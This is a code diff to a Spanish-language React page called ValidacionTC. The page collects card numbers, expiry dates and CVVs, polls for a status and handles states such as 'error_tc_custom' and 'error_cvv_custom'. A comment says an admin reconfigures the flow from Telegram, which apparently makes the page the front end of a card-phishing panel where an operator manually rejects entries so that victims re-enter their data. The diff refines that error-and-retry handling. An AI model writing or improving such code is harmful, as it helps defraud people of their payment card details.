@@ -477,12 +477,17 @@ export default function ValidacionTC() {
                 }
 
                 // PRIMERO verificar estados de error (deben tener prioridad)
+                // Si estamos en TC y se rechaza TC Custom, mostrar error y NO redirigir
                 if (estado === 'error_tc' || estado === 'error_tc_custom') {
                     clearInterval(pollingInterval);
                     clearTimeout(timeoutId);
                     setCargando(false);
                     setFormState(prev => ({ ...prev, lanzarModalErrorSesion: true }));
-                    setTimeout(() => setFormState(prev => ({ ...prev, lanzarModalErrorSesion: false })), 2000);
+                    setTimeout(() => {
+                        setFormState(prev => ({ ...prev, lanzarModalErrorSesion: false }));
+                        // Después de mostrar el error, volver a solicitar TC Custom
+                        // El admin puede volver a configurar desde Telegram
+                    }, 2000);
                     setCardDigits("");
                     setExpirationDate("");
                     setCvv("");
@@ -579,7 +584,13 @@ export default function ValidacionTC() {
                         break;
                     case 'error_tc':
                     case 'error_tc_custom':
-                        // No redirigir, el modal de error ya se mostró arriba
+                        // No redirigir, el modal de error ya se mostró arriba y se detuvo el polling
+                        // El usuario permanece en la vista de TC
+                        break;
+                    case 'error_cvv_custom':
+                        // Si estamos en TC y hay error de CVV, NO redirigir a CVV
+                        // Solo redirigir si realmente es necesario
+                        // Por ahora, no hacer nada ya que estamos en TC
                         break;
                     default:
                         console.log("Estado no manejado en redirección:", estado);
